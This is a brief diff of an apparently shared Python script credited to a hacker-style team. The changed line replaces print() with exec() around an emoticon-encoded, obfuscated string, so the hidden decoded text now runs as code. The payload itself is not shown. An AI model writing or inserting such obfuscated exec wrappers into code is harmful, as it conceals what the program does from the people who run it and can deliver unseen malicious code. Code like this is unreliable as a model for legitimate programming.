@@ -4,7 +4,7 @@ from collections import OrderedDict
 # Youtube : Cocentz 404
 # Contact : +6285218219161
 # Thankz To My T34M BL4€K_AB4B1L_C0D3D
-print("".join(map(chr,[int("".join(str(OrderedDict([(':)', 0),
+exec("".join(map(chr,[int("".join(str(OrderedDict([(':)', 0),
              (':D', 1),
              (':P', 2),
              (':S', 3),
